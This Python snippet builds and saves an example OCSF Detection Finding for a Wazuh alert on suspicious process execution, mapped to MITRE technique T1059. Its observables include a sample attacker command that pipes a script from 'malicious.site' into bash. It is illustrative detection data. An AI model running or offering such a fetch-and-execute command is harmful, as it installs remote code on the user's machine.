# Create example OCSF Detection Finding event structure
ocsf_detection_finding = {
    "activity_id": 1,  # Create
    "activity_name": "Create",
    "category_name": "Findings",
    "category_uid": 2,
    "class_name": "Detection Finding",
    "class_uid": 2004,
    "count": 1,
    "finding": {
        "created_time": 1640995200000,
        "desc": "Wazuh security alert for suspicious process execution",
        "first_seen_time": 1640995200000,
        "last_seen_time": 1640995200000,
        "modified_time": 1640995200000,
        "product_uid": "wazuh-manager-001",
        "title": "Process Activity Alert",
        "types": ["Process/Process Activity"],
        "uid": "1640995200.123456",
        "attack": [
            {
                "tactics": [
                    {
                        "name": "Execution",
                        "uid": "TA0002"
                    }
                ],
                "technique": {
                    "name": "Command and Scripting Interpreter",
                    "uid": "T1059"
                }
            }
        ],
        "related_events": [
            {
                "uid": "wazuh-alert-12345"
            }
        ]
    },
    "message": "Suspicious process execution detected on endpoint",
    "metadata": {
        "event_code": "process_activity",
        "product": {
            "feature": {
                "name": "Process Monitor"
            },
            "name": "Wazuh",
            "uid": "wazuh-4.x",
            "vendor_name": "Wazuh Inc",
            "version": "4.8.0"
        },
        "profiles": ["security_control"],
        "version": "1.1.0"
    },
    "observables": [
        {
            "name": "process.cmd_line", 
            "type": "Command Line",
            "type_id": 6,
            "value": "/bin/bash -c 'curl -s http://malicious.site/payload.sh | bash'"
        },
        {
            "name": "device.ip",
            "type": "IP Address", 
            "type_id": 2,
            "value": "192.168.1.100"
        }
    ],
    "raw_data": "{\"timestamp\":\"2024-01-01T00:00:00.000Z\",\"rule\":{\"level\":10,\"description\":\"Suspicious process execution\",\"id\":\"100001\"},\"agent\":{\"id\":\"001\",\"name\":\"web-server-01\",\"ip\":\"192.168.1.100\"}}",
    "severity": "High",
    "severity_id": 4,
    "status": "New",
    "status_code": "process_detected",
    "status_detail": "Suspicious command line execution pattern detected",
    "status_id": 1,
    "time": 1640995200000,
    "timezone_offset": 0,
    "type_name": "Detection Finding: Create",
    "type_uid": 200401,
    "unmapped": {
        "wazuh_rule_groups": ["process", "suspicious"],
        "wazuh_location": "/var/log/auth.log",
        "wazuh_decoder": "process_monitor"
    }
}

# Save as formatted JSON
with open('example_ocsf_detection_finding.json', 'w') as f:
    json.dump(ocsf_detection_finding, f, indent=2)

print("OCSF Detection Finding Event Example:")
print("=" * 50)
print(json.dumps(ocsf_detection_finding, indent=2))
print(f"\nJSON file saved: example_ocsf_detection_finding.json")